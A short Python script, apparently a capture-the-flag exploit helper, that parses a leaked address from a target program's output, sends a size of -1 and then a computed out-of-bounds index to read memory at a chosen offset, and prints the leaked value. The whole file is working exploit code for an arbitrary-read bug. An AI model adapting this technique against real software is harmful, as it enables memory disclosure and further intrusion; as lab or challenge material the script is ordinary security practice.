import os,sys,time,re
K=int(sys.argv[1])
def readuntil(sub,to=5):
    buf=b""; end=time.time()+to
    while sub.encode() not in buf and time.time()<end:
        import select
        r,_,_=select.select([0],[],[],0.3)
        if r:
            d=os.read(0,4096)
            if not d: break
            buf+=d
    return buf
b=readuntil("flag:")
b+=readuntil("\n")
m=re.search(rb"flag:\s*(0x[0-9a-fA-F]+)",b)
addr=int(m.group(1),16)
off=addr%8
readuntil("size>")
os.write(1,b"-1\n")
readuntil("index>")
idx=addr//8 + K
os.write(1,(str(idx)+"\n").encode())
res=readuntil("\n",5)
mv=re.search(rb"0x([0-9a-fA-F]+)",res.split(b"index>")[-1])
val=mv.group(1).decode() if mv else "?"
sys.stderr.write("ADDR=%x OFF=%d K=%d VAL=%s\n"%(addr,off,K,val))
